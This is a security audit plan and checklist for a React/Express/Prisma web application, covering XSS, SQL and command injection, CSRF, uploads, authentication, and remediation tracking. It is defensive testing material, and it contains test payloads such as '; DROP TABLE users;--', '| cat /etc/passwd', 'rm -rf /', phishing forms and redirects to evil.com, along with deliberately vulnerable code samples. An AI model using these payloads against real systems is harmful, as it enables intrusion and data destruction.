# Web Application Security Audit Plan

**Application:** Navarro County
**Stack:** React 18 / TypeScript / Express / Prisma / PostgreSQL
**Audit Date:** ******\_\_\_******
**Auditor(s):** ******\_\_\_******
**Version/Commit:** ******\_\_\_******

---

## Table of Contents

1. [Pre-Audit Preparation](#pre-audit-preparation)
2. [Threat Modeling Assumptions](#threat-modeling-assumptions)
3. [Vulnerability Categories](#vulnerability-categories)
   - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
   - [SQL Injection](#sql-injection)
   - [Command Injection](#command-injection)
   - [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
   - [File Upload Attacks](#file-upload-attacks)
   - [Mass Assignment & Overposting](#mass-assignment--overposting)
   - [HTML Injection](#html-injection)
   - [JSON & API Injection](#json--api-injection)
   - [Authentication & Credential Abuse](#authentication--credential-abuse)
   - [Business Logic Abuse](#business-logic-abuse)
   - [Denial of Service (Input-Based)](#denial-of-service-input-based)
   - [Header Injection](#header-injection)
4. [Cross-Cutting Security Controls](#cross-cutting-security-controls)
   - [Input Validation Strategies](#input-validation-strategies)
   - [Context-Aware Output Escaping](#context-aware-output-escaping)
   - [Content Security Policy (CSP)](#content-security-policy-csp)
   - [Least Privilege](#least-privilege)
5. [Tooling & Manual Testing Guidance](#tooling--manual-testing-guidance)
6. [Risk Rating Guidance](#risk-rating-guidance)
7. [Post-Audit Remediation Tracking](#post-audit-remediation-tracking)

---

## Pre-Audit Preparation

### Environment Setup

- [ ] Clone repository at specific commit hash
- [ ] Set up local development environment
- [ ] Configure test database with seed data
- [ ] Obtain test user accounts (regular, admin)
- [ ] Document all API endpoints from routes
- [ ] Map authentication flows (JWT, OAuth)
- [ ] Review `.env.example` for all configuration options

### Documentation Review

- [ ] Review README and architecture docs
- [ ] Identify all external service integrations
- [ ] Map data flow diagrams (user input → storage → output)
- [ ] List all user roles and permission levels
- [ ] Document all third-party dependencies

### Scope Definition

| In Scope                     | Out of Scope                        |
| ---------------------------- | ----------------------------------- |
| Express API (`packages/api`) | Third-party service vulnerabilities |
| React frontend (`apps/web`)  | Infrastructure/hosting (Railway)    |
| Prisma schema & queries      | DDoS at network level               |
| Authentication flows         | Physical security                   |
| File uploads (if any)        | Social engineering                  |
| Webhook endpoints            | Mobile applications                 |

### Key Files to Review

```
packages/api/src/
├── routes/           # All API endpoints
├── middleware/       # Auth, error handling, validation
├── services/         # Business logic
├── config/           # Passport strategies
└── index.ts          # Express configuration

apps/web/src/
├── lib/api.ts        # API client
├── stores/           # Auth state management
├── components/       # User input handling
└── pages/            # Route handlers

packages/database/
├── prisma/schema.prisma  # Data model
└── src/                   # Seed scripts, migrations
```

---

## Threat Modeling Assumptions

### Trust Boundaries

1. **Browser → API**: Untrusted (all user input)
2. **API → Database**: Trusted (parameterized via Prisma)
3. **API → External Services**: Semi-trusted (validate responses)
4. **Admin → API**: Elevated trust, still validate

### Attacker Profiles

| Profile                | Capabilities                    | Goals                            |
| ---------------------- | ------------------------------- | -------------------------------- |
| Anonymous              | Unauthenticated requests        | Account takeover, data scraping  |
| Authenticated User     | Valid JWT, standard permissions | Privilege escalation, data theft |
| Malicious Admin        | Admin JWT                       | Data exfiltration, persistence   |
| Compromised Dependency | Code execution in build/runtime | Supply chain attack              |

### Critical Assets

- User credentials (password hashes, OAuth tokens)
- User PII (email, location history, IP addresses)
- Session tokens (JWT, refresh tokens)
- Admin audit logs
- API keys and secrets

---

## Vulnerability Categories

---

### Cross-Site Scripting (XSS)

#### Description

Injection of malicious scripts into web pages viewed by other users. Enables session hijacking, credential theft, defacement, and malware distribution.

#### Where to Look

- `dangerouslySetInnerHTML` usage in React components
- CMS content rendering (TipTap editor output)
- URL parameter reflection in UI
- Error messages displaying user input
- User-generated content (notes, comments)
- Admin dashboard displaying user data

#### Audit Checklist

- [ ] Search for `dangerouslySetInnerHTML` - verify all inputs sanitized
- [ ] Verify DOMPurify usage on all HTML content
- [ ] Check URL params aren't reflected unsanitized
- [ ] Test stored XSS in all text fields (notes, names, etc.)
- [ ] Test XSS in file upload filenames
- [ ] Verify React's default escaping isn't bypassed
- [ ] Check meta tags for injection points
- [ ] Test SVG upload/rendering for embedded scripts
- [ ] Audit admin panels displaying user-submitted data

#### Common Red Flags

```tsx
// BAD: Unsanitized HTML
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// BAD: Template literal in href
<a href={`javascript:${userInput}`}>

// BAD: Unescaped URL params
const name = searchParams.get("name");
<h1>Welcome {name}</h1>  // Safe in React, but check context
```

#### Recommended Mitigations

- Use DOMPurify for all HTML content: `sanitizeHtml(content)`
- Whitelist allowed HTML tags and attributes
- Implement strict CSP with nonce-based scripts
- Use `textContent` instead of `innerHTML` where possible
- Validate URLs against allowlist before rendering

#### Verification / Testing Notes

```bash
# Test payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# Tools
- Browser DevTools (check DOM for unescaped content)
- Burp Suite (inject payloads in all parameters)
- XSS Hunter (for blind XSS detection)
```

---

### SQL Injection

#### Description

Injection of malicious SQL through user input, enabling unauthorized data access, modification, or deletion.

#### Where to Look

- Raw SQL queries (`$queryRaw`, `$executeRaw` in Prisma)
- Dynamic query construction
- Search/filter functionality
- Sorting parameters
- Pagination (limit/offset from user input)

#### Audit Checklist

- [ ] Search for `$queryRaw` and `$executeRaw` usage
- [ ] Verify all raw queries use parameterized inputs
- [ ] Check search endpoints for query construction
- [ ] Verify ORDER BY clauses don't use raw user input
- [ ] Check LIMIT/OFFSET aren't directly from user input
- [ ] Review any string concatenation in database operations
- [ ] Audit stored procedures (if any)

#### Common Red Flags

```typescript
// BAD: String interpolation in raw query
await prisma.$queryRaw`SELECT * FROM users WHERE name = '${userInput}'`;

// BAD: Dynamic column name
const sortBy = req.query.sort;
await prisma.user.findMany({ orderBy: { [sortBy]: "asc" } }); // Validate sortBy!

// GOOD: Parameterized query
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${userInput}`;
```

#### Recommended Mitigations

- Use Prisma's query builder exclusively (inherently parameterized)
- Whitelist allowed column names for sorting/filtering
- Validate and cast numeric inputs (limit, offset, IDs)
- Never construct queries via string concatenation
- Use prepared statements for any raw SQL

#### Verification / Testing Notes

```bash
# Test payloads (in search, filter, sort params)
' OR '1'='1
'; DROP TABLE users;--
1 UNION SELECT * FROM users--
ORDER BY 1--

# Tools
- sqlmap (automated detection)
- Manual testing with Burp Suite
```

---

### Command Injection

#### Description

Execution of arbitrary system commands through user input passed to shell functions.

#### Where to Look

- `child_process` usage (exec, spawn, execSync)
- File operations with user-controlled paths
- Image processing pipelines
- PDF generation
- Any shell command construction

#### Audit Checklist

- [ ] Search for `exec`, `execSync`, `spawn`, `spawnSync`
- [ ] Search for `child_process` imports
- [ ] Check file path construction from user input
- [ ] Review Puppeteer usage for URL injection
- [ ] Check environment variable handling
- [ ] Audit any CLI tool invocations

#### Common Red Flags

```typescript
// BAD: User input in shell command
exec(`convert ${userFilename} output.png`);

// BAD: Path traversal possible
const filePath = `uploads/${req.body.filename}`;
fs.readFile(filePath);

// BAD: URL injection in Puppeteer
await page.goto(userProvidedUrl);
```

#### Recommended Mitigations

- Avoid shell commands entirely; use native Node.js APIs
- If shell required, use `execFile` with argument arrays (no shell)
- Whitelist allowed characters in filenames
- Use path.basename() to strip directory traversal
- Validate URLs against allowlist before Puppeteer navigation

#### Verification / Testing Notes

```bash
# Test payloads
; ls -la
| cat /etc/passwd
`whoami`
$(whoami)
file.txt; rm -rf /
../../../etc/passwd

# Check for
- Any child_process usage
- File operations with user paths
- URL handling in Puppeteer/headless browsers
```

---

### Cross-Site Request Forgery (CSRF)

#### Description

Forcing authenticated users to perform unintended actions by exploiting the browser's automatic credential inclusion.

#### Where to Look

- State-changing endpoints (POST, PUT, DELETE)
- Cookie-based authentication
- Form submissions
- CORS configuration
- SameSite cookie attributes

#### Audit Checklist

- [ ] Verify JWT is sent via Authorization header (not cookies)
- [ ] Check CORS configuration for overly permissive origins
- [ ] Review SameSite attribute on any cookies
- [ ] Check state-changing GET requests (should not exist)
- [ ] Verify OAuth callback URLs validate state parameter
- [ ] Check webhook endpoints for signature verification

#### Common Red Flags

```typescript
// BAD: Overly permissive CORS
app.use(cors({ origin: '*', credentials: true }));

// BAD: State change via GET
app.get('/api/delete-account', ...);

// BAD: Missing state validation in OAuth
router.get('/callback', (req) => {
  // No state parameter check
});
```

#### Recommended Mitigations

- Use Authorization header for JWT (not cookies)
- Strict CORS origin whitelist
- SameSite=Strict on all cookies
- Require re-authentication for sensitive operations
- Validate state parameter in OAuth flows

#### Verification / Testing Notes

```html
<!-- CSRF test page -->
<form action="https://target.com/api/delete" method="POST">
  <input type="hidden" name="id" value="123" />
  <input type="submit" value="Click me" />
</form>

<!-- Check if credentials sent cross-origin -->
<script>
  fetch("https://target.com/api/me", { credentials: "include" })
    .then((r) => r.json())
    .then(console.log);
</script>
```

---

### File Upload Attacks

#### Description

Exploiting file upload functionality to execute code, overwrite files, or exhaust resources.

#### Where to Look

- Profile picture uploads
- Document/image uploads
- Import functionality (CSV, JSON)
- Backup/restore features

#### Audit Checklist

- [ ] Check file type validation (extension AND magic bytes)
- [ ] Verify filename sanitization
- [ ] Check for path traversal in filenames
- [ ] Verify file size limits enforced server-side
- [ ] Check if uploaded files are served with correct Content-Type
- [ ] Verify files stored outside web root
- [ ] Check for zip bomb / archive extraction vulnerabilities
- [ ] Verify image processing doesn't execute embedded code

#### Common Red Flags

```typescript
// BAD: Extension-only validation
if (file.name.endsWith(".jpg")) {
  /* allow */
}

// BAD: User-controlled storage path
const path = `uploads/${req.body.folder}/${file.name}`;

// BAD: Serving uploads directly
app.use("/uploads", express.static("uploads"));
```

#### Recommended Mitigations

- Validate magic bytes, not just extension
- Generate random filenames server-side
- Store outside web root, serve via authenticated endpoint
- Set Content-Disposition: attachment for downloads
- Implement file size limits at multiple layers
- Scan uploads with antivirus (ClamAV)
- Re-encode images to strip metadata/exploits

#### Verification / Testing Notes

```bash
# Test files
- .php file renamed to .jpg
- SVG with embedded JavaScript
- Polyglot file (valid image + valid HTML)
- File with null bytes: shell.php%00.jpg
- Path traversal: ../../../etc/passwd.jpg
- Oversized file (test limits)
- Zip bomb (nested compression)
```

---

### Mass Assignment & Overposting

#### Description

Attackers modifying object properties they shouldn't have access to by including extra fields in requests.

#### Where to Look

- User profile updates
- Settings modifications
- Any PATCH/PUT endpoints
- Object creation endpoints
- Admin vs user endpoints sharing code

#### Audit Checklist

- [ ] Check all update endpoints for field whitelisting
- [ ] Verify `role`, `isAdmin`, `isActive` can't be set by users
- [ ] Check Prisma update calls for spread operators
- [ ] Review Zod schemas for strict field definitions
- [ ] Verify sensitive fields excluded from request bodies
- [ ] Check for shared validation between admin/user routes

#### Common Red Flags

```typescript
// BAD: Spreading entire request body
await prisma.user.update({
  where: { id: userId },
  data: req.body, // User could send { role: 'ADMIN' }
});

// BAD: Partial whitelist
const { name, email, ...rest } = req.body;
// 'rest' still contains dangerous fields
```

#### Recommended Mitigations

- Explicit field whitelisting in all updates
- Use Zod schemas with `.pick()` or `.omit()`
- Separate DTOs for create vs update operations
- Never spread request body directly to database
- Test with extra fields in all requests

#### Verification / Testing Notes

```bash
# Add extra fields to legitimate requests
PATCH /api/auth/me
{
  "name": "John",
  "role": "ADMIN",
  "isActive": true,
  "passwordHash": "...",
  "createdAt": "2020-01-01"
}

# Check if any fields unexpectedly modified
```

---

### HTML Injection

#### Description

Injecting HTML markup to alter page structure, phishing, or enabling further attacks.

#### Where to Look

- Email templates
- PDF generation
- Error pages
- User profile displays
- CMS content areas
- Notification/announcement content

#### Audit Checklist

- [ ] Check email template variable escaping
- [ ] Verify PDF generation escapes user content
- [ ] Check error pages don't reflect user input
- [ ] Audit all `dangerouslySetInnerHTML` usage
- [ ] Verify link href attributes are validated
- [ ] Check meta tag content injection

#### Common Red Flags

```typescript
// BAD: Unescaped in email
const html = `<p>Hello ${userName}</p>`;

// BAD: Reflected in error
res.send(`Error: ${req.query.message} not found`);
```

#### Recommended Mitigations

- HTML-encode all user content in templates
- Use templating engines with auto-escaping
- Validate URLs before rendering as links
- Sanitize with DOMPurify for rich content

#### Verification / Testing Notes

```html
<!-- Test payloads -->
<h1>Phishing</h1>
<form action="https://evil.com"><input name="password" /></form>
<base href="https://evil.com" />
<meta http-equiv="refresh" content="0;url=https://evil.com" />
```

---

### JSON & API Injection

#### Description

Manipulating JSON structure or API behavior through crafted input.

#### Where to Look

- JSON parsing from user input
- GraphQL queries (if used)
- Webhook payload processing
- Configuration endpoints
- Bulk import/export features

#### Audit Checklist

- [ ] Check JSON.parse error handling
- [ ] Verify prototype pollution prevention
- [ ] Check for JSON injection in string fields
- [ ] Verify API versioning and deprecation handling
- [ ] Check batch endpoints for array size limits
- [ ] Verify webhook signature validation

#### Common Red Flags

```typescript
// BAD: Prototype pollution possible
const config = JSON.parse(userInput);
Object.assign(defaults, config);

// BAD: No size limit on arrays
const ids = req.body.ids; // Could be [1,2,3,...1000000]
await prisma.item.findMany({ where: { id: { in: ids } } });
```

#### Recommended Mitigations

- Use `Object.create(null)` for parsed objects
- Validate JSON structure with Zod schemas
- Limit array sizes in bulk operations
- Freeze prototypes: `Object.freeze(Object.prototype)`
- Validate Content-Type headers

#### Verification / Testing Notes

```json
// Prototype pollution
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// Oversized arrays
{"ids": [1,2,3,...100000]}

// Type confusion
{"id": {"$gt": 0}}  // NoSQL-style injection
```

---

### Authentication & Credential Abuse

#### Description

Attacks targeting authentication mechanisms to gain unauthorized access.

#### Where to Look

- Login endpoints
- Password reset flow
- JWT generation and validation
- OAuth implementation
- Session management
- Remember me functionality

#### Audit Checklist

- [ ] Verify rate limiting on login endpoint
- [ ] Check password reset token entropy and expiration
- [ ] Verify JWT secret strength and rotation capability
- [ ] Check for timing attacks in authentication
- [ ] Verify account lockout after failed attempts
- [ ] Check password requirements enforcement
- [ ] Verify secure password hashing (bcrypt, rounds >= 12)
- [ ] Check refresh token rotation
- [ ] Verify logout invalidates all tokens
- [ ] Check OAuth state parameter validation
- [ ] Verify email enumeration prevention

#### Common Red Flags

```typescript
// BAD: Weak JWT secret
const token = jwt.sign(payload, 'secret123');

// BAD: Timing attack vulnerable
if (user.password === providedPassword) { }

// BAD: Predictable reset token
const token = Date.now().toString();

// BAD: No rate limiting
app.post('/login', async (req, res) => { ... });
```

#### Recommended Mitigations

- bcrypt with cost factor >= 12
- Cryptographically random tokens (crypto.randomBytes)
- Rate limiting: 5 attempts / 15 minutes
- Account lockout with exponential backoff
- Constant-time comparison for secrets
- JWT expiration: 15 minutes access, 24 hours refresh
- Rotate refresh tokens on use
- Invalidate all tokens on password change

#### Verification / Testing Notes

```bash
# Test credential stuffing
- Attempt 100 logins, verify lockout

# Test password reset
- Check token entropy
- Test token reuse after password change
- Test expired token handling

# Test JWT
- Modify payload without re-signing
- Use 'none' algorithm
- Brute force weak secrets

# Tools
- jwt.io (decode and modify)
- Burp Intruder (brute force)
```

---

### Business Logic Abuse

#### Description

Exploiting flaws in application logic rather than technical vulnerabilities.

#### Where to Look

- Pricing/discount calculations
- Rate/quota enforcement
- Multi-step workflows
- State machine transitions
- Referral/reward systems
- Privilege boundaries

#### Audit Checklist

- [ ] Check race conditions in transaction processing
- [ ] Verify trip creation limits enforced
- [ ] Check if free tier limits can be bypassed
- [ ] Verify role checks on all protected endpoints
- [ ] Check for IDOR in resource access
- [ ] Verify workflow steps can't be skipped
- [ ] Check for negative values in quantities
- [ ] Verify time-based restrictions (token expiry)

#### Common Red Flags

```typescript
// BAD: IDOR - no ownership check
app.get("/api/trips/:id", async (req, res) => {
  const trip = await prisma.trip.findUnique({ where: { id: req.params.id } });
  res.json(trip); // Should verify req.user.id === trip.userId
});

// BAD: Race condition
const balance = await getBalance(userId);
if (balance >= amount) {
  await deductBalance(userId, amount); // Another request could race
}
```

#### Recommended Mitigations

- Always verify resource ownership
- Use database transactions for multi-step operations
- Implement optimistic locking for concurrent access
- Server-side validation of all business rules
- Log and alert on suspicious patterns
- Rate limit by user, not just IP

#### Verification / Testing Notes

```bash
# IDOR testing
- Access other users' resources by changing IDs
- Try sequential ID enumeration

# Race conditions
- Send concurrent requests to same endpoint
- Test with Burp Repeater (parallel requests)

# Logic flaws
- Skip steps in multi-step processes
- Use negative quantities
- Manipulate timestamps
```

---

### Denial of Service (Input-Based)

#### Description

Exhausting server resources through malicious input rather than network-level flooding.

#### Where to Look

- Regular expression usage
- JSON/XML parsing
- Image processing
- Search functionality
- Recursive operations
- File uploads

#### Audit Checklist

- [ ] Check regex for ReDoS vulnerabilities
- [ ] Verify request body size limits
- [ ] Check recursion depth limits
- [ ] Verify timeout on external API calls
- [ ] Check pagination limits
- [ ] Verify file upload size limits
- [ ] Check for billion laughs / XML bombs (if XML used)
- [ ] Verify query complexity limits

#### Common Red Flags

```typescript
// BAD: ReDoS vulnerable regex
const emailRegex = /^([a-zA-Z0-9]+)+@/;

// BAD: No pagination limit
const items = await prisma.item.findMany(); // Could return millions

// BAD: No timeout on external call
const response = await fetch(externalUrl);

// BAD: Unbounded recursion
function process(data) {
  if (data.children) {
    data.children.forEach(process);
  }
}
```

#### Recommended Mitigations

- Use tested regex libraries (validator.js)
- Implement request timeouts (30 seconds max)
- Limit pagination: max 100 items per page
- Limit request body size: 1MB default
- Limit file upload size: based on use case
- Implement circuit breakers for external services
- Use streaming for large data processing

#### Verification / Testing Notes

```bash
# ReDoS test
- Send: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

# Large payload
- Send 100MB JSON body
- Send deeply nested JSON (1000 levels)

# Pagination abuse
- Request ?limit=1000000

# Regex testing tools
- recheck (https://makenowjust-labs.github.io/recheck/)
```

---

### Header Injection

#### Description

Injecting malicious headers through user input that's reflected in HTTP responses.

#### Where to Look

- Redirect URLs
- Cookie setting
- Custom header generation
- CORS headers
- Content-Disposition

#### Audit Checklist

- [ ] Check redirect URLs for CRLF injection
- [ ] Verify Location header values are validated
- [ ] Check Set-Cookie for user input
- [ ] Verify Content-Disposition filename encoding
- [ ] Check custom header generation

#### Common Red Flags

```typescript
// BAD: Unvalidated redirect
res.redirect(req.query.returnUrl);

// BAD: User input in header
res.setHeader("X-Custom", req.query.value);

// BAD: Filename in Content-Disposition
res.setHeader("Content-Disposition", `attachment; filename="${userFilename}"`);
```

#### Recommended Mitigations

- Whitelist allowed redirect destinations
- Strip CR/LF from header values
- Encode filenames in Content-Disposition
- Use framework's built-in redirect protection

#### Verification / Testing Notes

```bash
# CRLF injection
returnUrl=http://evil.com%0d%0aSet-Cookie:+session=hijacked

# Header injection
value=test%0d%0aX-Injected:+header

# Open redirect
returnUrl=//evil.com
returnUrl=https://evil.com
returnUrl=/\evil.com
```

---

## Cross-Cutting Security Controls

---

### Input Validation Strategies

#### Audit Checklist

- [ ] Zod schemas defined for all API endpoints
- [ ] Validation runs before any processing
- [ ] Type coercion is explicit, not implicit
- [ ] Error messages don't leak validation logic
- [ ] Validation is server-side (client-side is UX only)
- [ ] Allow-lists preferred over deny-lists
- [ ] Length limits on all string fields

#### Key Patterns

```typescript
// GOOD: Explicit schema with constraints
const updateUserSchema = z
  .object({
    name: z.string().min(1).max(100),
    email: z.string().email().max(255),
  })
  .strict(); // Reject unknown fields

// GOOD: Validate early
router.patch("/user", async (req, res) => {
  const result = updateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ error: "Invalid input" });
  }
  // Proceed with validated data only
});
```

---

### Context-Aware Output Escaping

#### Audit Checklist

- [ ] HTML context: HTML-encode (`&lt;`, `&gt;`, etc.)
- [ ] JavaScript context: JSON.stringify or JS-encode
- [ ] URL context: encodeURIComponent
- [ ] CSS context: CSS-encode
- [ ] SQL context: parameterized queries (Prisma)
- [ ] Shell context: avoid or use execFile with args array

#### Key Patterns

```tsx
// HTML context (React auto-escapes)
<div>{userContent}</div>  // Safe

// HTML context (manual)
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }} />

// URL context
<a href={`/search?q=${encodeURIComponent(query)}`}>

// JavaScript context
<script>const data = {JSON.stringify(userData)};</script>
```

---

### Content Security Policy (CSP)

#### Current Implementation Review

```typescript
// packages/api/src/index.ts - Helmet CSP config
helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://unpkg.com"],
      scriptSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://www.googletagmanager.com",
        "https://cloud.umami.is",
      ],
      imgSrc: ["'self'", "data:", "https:", "blob:"],
      connectSrc: ["'self'" /* ... external APIs */],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      frameSrc: ["'none'"],
    },
  },
});
```

#### Audit Checklist

- [ ] No `'unsafe-eval'` in script-src
- [ ] Minimize `'unsafe-inline'` usage
- [ ] Report-uri configured for violations
- [ ] frame-ancestors restricts embedding
- [ ] upgrade-insecure-requests enabled
- [ ] All external domains explicitly listed

#### Recommendations

- [ ] Replace `'unsafe-inline'` with nonces for scripts
- [ ] Add `report-uri` directive for monitoring
- [ ] Consider `require-trusted-types-for 'script'`

---

### Least Privilege

#### Database

- [ ] Application user has minimal permissions
- [ ] No DROP/CREATE permissions in production
- [ ] Separate read-only user for analytics
- [ ] Connection string not in client-side code

#### Filesystem

- [ ] Upload directory outside web root
- [ ] No write access to application code
- [ ] Temp files cleaned up
- [ ] Logs don't contain sensitive data

#### API Keys & Secrets

- [ ] Separate keys per environment
- [ ] Keys rotatable without deployment
- [ ] No secrets in client-side code
- [ ] Secrets not logged

#### User Roles

- [ ] Default role is least privileged
- [ ] Role checks on every protected endpoint
- [ ] Admin functions require re-authentication
- [ ] Role changes logged

---

## Tooling & Manual Testing Guidance

### Automated Scanning

| Tool                    | Purpose                    | When to Use      |
| ----------------------- | -------------------------- | ---------------- |
| `npm audit`             | Dependency vulnerabilities | Every build      |
| `pnpm audit`            | Dependency vulnerabilities | Every build      |
| Snyk                    | Deep dependency analysis   | Weekly           |
| ESLint security plugins | Static code analysis       | Every commit     |
| OWASP ZAP               | Dynamic scanning           | Before release   |
| Burp Suite              | Proxy and manual testing   | During audit     |
| sqlmap                  | SQL injection detection    | Targeted testing |
| Nuclei                  | Template-based scanning    | Periodic scans   |

### Manual Testing Approach

1. **Reconnaissance**

   - Map all endpoints from route files
   - Identify authentication requirements
   - Document input/output formats

2. **Authentication Testing**

   - Test all auth flows (login, register, reset, OAuth)
   - Test token handling (expiry, refresh, revocation)
   - Test session management

3. **Authorization Testing**

   - Test horizontal access (user A accessing user B's data)
   - Test vertical access (user accessing admin functions)
   - Test resource ownership checks

4. **Input Testing**

   - Test each input field with attack payloads
   - Test boundary conditions
   - Test type confusion

5. **Business Logic Testing**
   - Test workflow manipulation
   - Test race conditions
   - Test rate limits

### Browser Extensions

- EditThisCookie (cookie manipulation)
- ModHeader (header modification)
- Wappalyzer (technology detection)
- React DevTools (state inspection)

---

## Risk Rating Guidance

### Severity Matrix

| Impact                       | Exploitability           | Rating   |
| ---------------------------- | ------------------------ | -------- |
| Critical (RCE, data breach)  | Easy (no auth)           | Critical |
| Critical                     | Moderate (auth required) | High     |
| High (privilege escalation)  | Easy                     | High     |
| High                         | Moderate                 | Medium   |
| Medium (data exposure)       | Easy                     | Medium   |
| Medium                       | Hard                     | Low      |
| Low (information disclosure) | Any                      | Low      |

### CVSS v3.1 Guidance

- **Critical (9.0-10.0)**: Immediate patching required
- **High (7.0-8.9)**: Patch within 1 week
- **Medium (4.0-6.9)**: Patch within 1 month
- **Low (0.1-3.9)**: Patch in next release cycle

### Risk Factors

| Factor         | Increases Risk   | Decreases Risk    |
| -------------- | ---------------- | ----------------- |
| Authentication | None required    | Admin only        |
| Network        | Internet exposed | Internal only     |
| Data           | PII, credentials | Public data       |
| Complexity     | Simple exploit   | Requires chaining |

---

## Post-Audit Remediation Tracking

### Finding Template

```markdown
### [FINDING-001] Title

**Severity:** Critical / High / Medium / Low
**CVSS:** X.X
**Status:** Open / In Progress / Resolved / Accepted Risk
**Assignee:** ******\_\_\_******
**Due Date:** ******\_\_\_******

**Description:**
[Detailed description of the vulnerability]

**Affected Components:**

- File: `path/to/file.ts:123`
- Endpoint: `POST /api/endpoint`

**Proof of Concept:**
[Steps to reproduce or exploit code]

**Recommendation:**
[Specific fix guidance]

**Remediation:**

- [ ] Fix implemented
- [ ] Code reviewed
- [ ] Tests added
- [ ] Deployed to staging
- [ ] Verified fix works
- [ ] Deployed to production

**Notes:**
[Additional context, related findings, etc.]
```

### Tracking Table

| ID          | Title | Severity | Status | Assignee | Due | Verified |
| ----------- | ----- | -------- | ------ | -------- | --- | -------- |
| FINDING-001 |       |          |        |          |     |          |
| FINDING-002 |       |          |        |          |     |          |
| FINDING-003 |       |          |        |          |     |          |

### Sign-Off

| Role             | Name | Date | Signature |
| ---------------- | ---- | ---- | --------- |
| Lead Auditor     |      |      |           |
| Development Lead |      |      |           |
| Security Owner   |      |      |           |

---

## Appendix: Quick Reference

### OWASP Top 10 (2021) Mapping

| OWASP                          | This Document                       |
| ------------------------------ | ----------------------------------- |
| A01: Broken Access Control     | Authorization, IDOR, Business Logic |
| A02: Cryptographic Failures    | Authentication, Credential Storage  |
| A03: Injection                 | SQL, Command, XSS, HTML, Header     |
| A04: Insecure Design           | Threat Modeling, Business Logic     |
| A05: Security Misconfiguration | CSP, CORS, Headers                  |
| A06: Vulnerable Components     | Dependency Scanning                 |
| A07: Auth Failures             | Authentication section              |
| A08: Data Integrity Failures   | Mass Assignment, CSRF               |
| A09: Logging Failures          | Audit Logs, Monitoring              |
| A10: SSRF                      | Command Injection, URL Handling     |

### Common Payloads Cheat Sheet

```
XSS: <script>alert(1)</script>
XSS: <img src=x onerror=alert(1)>
SQLi: ' OR '1'='1
SQLi: '; DROP TABLE users;--
Command: ; ls -la
Command: | cat /etc/passwd
Path: ../../../etc/passwd
CRLF: %0d%0aInjected-Header: value
JSON: {"__proto__": {"isAdmin": true}}
```
